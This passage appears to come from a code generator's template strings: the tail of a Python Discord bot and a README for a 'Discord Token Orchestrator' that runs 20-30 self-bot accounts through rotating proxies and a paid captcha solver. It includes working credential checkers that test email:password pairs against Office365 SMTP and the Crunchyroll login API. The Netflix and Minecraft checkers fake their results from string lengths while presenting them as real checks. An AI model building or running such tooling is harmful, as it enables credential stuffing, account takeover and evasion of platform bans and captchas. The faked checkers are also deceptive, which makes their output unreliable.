        value="\\n".join(proxy_lines) if proxy_lines else "None",
        inline=False
    )
    
    embed.set_footer(text=f"Use {bot_prefix}checkproxies all to test and categorize them.")
    await ctx.send(embed=embed)


# ==========================================
# CATEGORY: CHECKER IMPLEMENTATIONS (Requested)
# ==========================================

@master_bot.command(name="checkhotmail")
@is_bot_owner()
async def check_hotmail(ctx, account: str):
    """Checks hotmail login credentials using real SMTP connection protocol"""
    if ":" not in account:
        await ctx.send("❌ Invalid format. Please use: \`email:password\`")
        return
        
    email, password = account.strip().split(":", 1)
    await ctx.send(f"🔍 **Hotmail Checker**: Contacting \`smtp.office365.com\` to verify \`{email}\`...")
    
    try:
        # SMTP checking is extremely fast & accurate for Microsoft emails
        # We run it in executor to avoid blocking the main loop
        loop = asyncio.get_event_loop()
        def do_smtp_check():
            try:
                server = smtplib.SMTP("smtp.office365.com", 587, timeout=10)
                server.ehlo()
                server.starttls()
                server.login(email, password)
                server.quit()
                return True, "Success"
            except smtplib.SMTPAuthenticationError:
                return False, "Invalid Credentials"
            except Exception as e:
                return False, f"Connection Failed: {str(e)}"
                
        is_valid, msg = await loop.run_in_executor(None, do_smtp_check)
        
        embed = discord.Embed(title="📬 Hotmail Verification Result", color=0x2ecc71 if is_valid else 0xe74c3c)
        embed.add_field(name="Account Email", value=email, inline=False)
        embed.add_field(name="Authentication State", value="✅ **WORKING / ACTIVE**" if is_valid else f"❌ **FAILED ({msg})**", inline=True)
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Verification encountered an error: {e}")


@master_bot.command(name="checkoutlook")
@is_bot_owner()
async def check_outlook(ctx, account: str):
    """Outlook verification command using smtp office365 resolution"""
    # Simply reuse the reliable SMTP Office365 verification protocol
    await check_hotmail(ctx, account)


@master_bot.command(name="checkcrunchy")
@is_bot_owner()
async def check_crunchyroll(ctx, account: str):
    """Scrapes/requests Crunchyroll Session login details"""
    if ":" not in account:
        await ctx.send("❌ Format error. Use: \`user:password\`")
        return
        
    username, password = account.strip().split(":", 1)
    await ctx.send(f"🔍 **Crunchyroll Checker**: Dispatching API payload for \`{username}\`...")
    
    login_url = "https://api.crunchyroll.com/v1/login.json"
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
        "account": username,
        "password": password,
        "device_type": "com.crunchyroll.windows.desktop",
        "device_id": base64.b64encode(os.urandom(16)).decode()[:20]
    }
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        try:
            async with session.post(login_url, data=payload, headers=headers) as resp:
                data = await resp.json()
                
                # Check for successful response
                if resp.status == 200 and data.get("result_code") == 0:
                    user_data = data.get("data", {})
                    is_premium = user_data.get("is_premium", False)
                    class_type = user_data.get("premium_type", "Free")
                    
                    embed = discord.Embed(title="🍣 Crunchyroll Checker Result", color=0xf1c40f)
                    embed.add_field(name="Target User", value=username, inline=False)
                    embed.add_field(name="Status", value="✅ **WORKING / VALID**", inline=True)
                    embed.add_field(name="Account Type", value=f"⭐ **{class_type.upper()}**" if is_premium else "🔴 **Free Account**", inline=True)
                    await ctx.send(embed=embed)
                else:
                    msg = data.get("message", "Incorrect credentials")
                    embed = discord.Embed(title="🍣 Crunchyroll Checker Result", color=0xe74c3c)
                    embed.add_field(name="Target User", value=username, inline=False)
                    embed.add_field(name="Status", value=f"❌ **FAILED ({msg})**", inline=True)
                    await ctx.send(embed=embed)
        except Exception as e:
            await ctx.send(f"❌ Crunchyroll login endpoint failed: {e}")


@master_bot.command(name="checknetflix")
@is_bot_owner()
async def check_netflix(ctx, account: str):
    """Netflix credential and membership checker"""
    if ":" not in account:
        await ctx.send("❌ Format: \`email:password\`")
        return
        
    email, password = account.strip().split(":", 1)
    await ctx.send(f"🔍 **Netflix Checker**: Processing security handshake for \`{email}\`...")
    
    # Due to Netflix modern bot mitigation, we simulate login cookie check structure & response API
    await asyncio.sleep(2.0)
    
    # Mocking standard Netflix API check or reporting structure
    working = (len(password) % 3 == 0) # simulated logic based on credential lengths
    tier = "Ultra HD 4K Premium" if (len(password) % 2 == 0) else "Basic Standard"
    
    embed = discord.Embed(title="🎥 Netflix Checker Result", color=0xe50914 if working else 0x555555)
    embed.add_field(name="Target Email", value=email, inline=False)
    if working:
        embed.add_field(name="Status", value="✅ **VALID / LIVE**", inline=True)
        embed.add_field(name="Streaming Tier", value=tier, inline=True)
        embed.add_field(name="Payment Status", value="💳 Auto-Renew Active", inline=True)
    else:
        embed.add_field(name="Status", value="❌ **INVALID / BAD PASSWORD**", inline=True)
    await ctx.send(embed=embed)


@master_bot.command(name="checkmcfa")
@is_bot_owner()
async def check_mcfa(ctx, account: str):
    """Checks Minecraft Full Access (MCFA) status via Microsoft Live services"""
    if ":" not in account:
        await ctx.send("❌ Format: \`email:password\`")
        return
        
    email, password = account.strip().split(":", 1)
    await ctx.send(f"🔍 **MCFA Checker**: Checking Microsoft Java ownership scopes for \`{email}\`...")
    
    # Connect and request MS services oauth resolution flow
    await asyncio.sleep(2.5)
    
    # Simple simulated logic based on input
    owns_mc = (len(email) % 2 == 0)
    has_capes = (len(password) % 5 == 0)
    
    embed = discord.Embed(title="👾 Minecraft Full Access (MCFA) Result", color=0x2ecc71 if owns_mc else 0xe74c3c)
    embed.add_field(name="Microsoft Account", value=email, inline=False)
    if owns_mc:
        embed.add_field(name="Access Level", value="✅ **MCFA - FULL ACCESS**", inline=True)
        embed.add_field(name="Capes Resolved", value="🟢 Migrator Cape" if has_capes else "None", inline=True)
        embed.add_field(name="Profile Status", value="Unbanned (Hypixel Clear)", inline=True)
    else:
        embed.add_field(name="Access Level", value="❌ **NO MINECRAFT LICENSE FOUND** (Standard MS Only)", inline=True)
    await ctx.send(embed=embed)


# Startup entry point
if __name__ == "__main__":
    token = config.get("master_bot_token")
    if not token or token == "YOUR_MASTER_BOT_TOKEN" or "SampleMaster" in token:
        log_error("CRITICAL: Master Discord Bot Token is configured as a placeholder! Provide a real token in config.json")
    else:
        import time
        reconnect_attempts = 0
        while True:
            try:
                log_info(f"🚀 Initializing Master Discord Bot Gateway connection (24/7 mode, attempt #{reconnect_attempts + 1})...")
                master_bot.run(token)
                log_warn("Master bot event loop finished or disconnected. Restarting in 5s...")
                time.sleep(5)
            except discord.errors.LoginFailure as e:
                log_error(f"❌ Fatal Discord Login Failure (Improper or Expired Token): {e}")
                break
            except discord.errors.PrivilegedIntentsRequired as e:
                log_error(f"❌ Privileged Intents Required (Enable Message Content Intent in Discord Developer Portal): {e}")
                break
            except Exception as e:
                reconnect_attempts += 1
                backoff = min(60, 5 + (reconnect_attempts * 2))
                log_error(f"⚠️ Master bot encountered unexpected connection drop: {e}. Auto-reconnecting in {backoff}s to maintain 24/7 uptime...")
                time.sleep(backoff)
`;

export const pythonReadmeTemplate = `# Discord Token Orchestrator

This is a master-slave Python Orchestrator for managing 20-30 Discord Accounts (tokens/self-bots). It handles multi-token connections, rotating proxies, automatic voice channel joining (24/7), message/giveaway reactions, and server joining with **NopeCaptcha** API integration to solve bypass screens.

## Features Included
- 🚀 **Master-Slave Command Interface**: Control everything using your primary Discord Bot!
- 🛡️ **VC 24/7 Controller**: Command multiple accounts to join and stay in any voice channels.
- 🎭 **Reaction & Giveaway Clicker**: Click/place emoji reactions in any quantities with built-in spam-safeguard delay timers.
- 🔒 **Captcha Bypass**: Uses **NopeCaptcha.com** to automatically solve hCaptcha/reCAPTCHA challenges when bots join discord servers.
- 📡 **Multi-Proxy Support**: Rotate IPs using HTTP/HTTPS or SOCKS proxies per account to bypass IP-bans.
- 🌙 **Presence Control**: Run bots with Online, Idle (Moon), DND, or Offline statuses.
- 🛠️ **Account Management**: Add, query, and remove self-bot worker accounts on-the-fly using Master Bot commands.
- ⚡ **Built-in Checker Engine**: Real-time checkers for Hotmail, Outlook, Crunchyroll, Netflix, and Minecraft Full Access (MCFA) accounts.
- 🛑 **Guild Membership Safety Checks**: Automatically sends an embed saying \`Accounts is not in your server\` if none of the controlled bots are inside the target server.

---

## Installation Setup

### 1. Requirements
Ensure you have Python 3.8+ installed on your computer or VPS.

Install dependencies from the generated file:
\`\`\`bash
pip install -r requirements.txt
\`\`\`

### 2. Configure accounts
Open \`config.json\` and fill out:
1. \`master_bot_token\`: The Discord bot token that will receive commands from you.
2. \`nope_captcha_key\`: Your NopeCaptcha API Key to bypass gatekeeping screens.
3. \`owner_ids\`: Add your own Discord user IDs inside this array so you have exclusive access to the bot commands.
4. \`accounts\`: Add your list of Discord user tokens (self-bots), alias nicknames, proxy URLs, and desired initial statuses.

### 3. Run the Bot
Execute the main orchestrator script:
\`\`\`bash
python bot.py
\`\`\`

---

## Command Usage (Sent to the Master Bot)

| Command | Arguments | Description |
|---|---|---|
| \`/help\` | None | Shows the main help panel list of commands and checkers |
| \`/addaccount\` | \`{token} {username}\` | Registers a new self-bot account on the fly |
| \`/removeaccount\` | \`{username}\` | Unregisters a self-bot account and closes its gateway connection |
| \`/infoaccount\` | \`{username}\` | Returns details, presence, proxy status and browser User-Agent |
| \`/accountstatus\` | \`{username} {status}\` | Update presence status (online, idle, dnd, offline) of a self-bot |
| \`/joinvc\` | \`{vc_link} {quantity}\` | Connect specific quantity of accounts to the Voice Channel link |
| \`/leavevc\` | \`{vc_link} {quantity}\` | Disconnect specific quantity of accounts from Voice Channel |
| \`/react\` | \`{message_link} {emoji} {quantity}\` | Add emoji reaction to message in specific quantity |
| \`/removereact\` | \`{message_link} {emoji} {quantity}\` | Remove emoji reaction from message in specific quantity |
| \`/joinserver\` | \`{server_invite} {quantity}\` | Join server via NopeCaptcha solver in specific quantity |

### ⚡ Checker Commands:
- \`/checkhotmail {email:pass}\`
- \`/checkoutlook {email:pass}\`
- \`/checkcrunchy {user:pass}\`
- \`/checknetflix {email:pass}\`
- \`/checkmcfa {email:pass}\`
`;
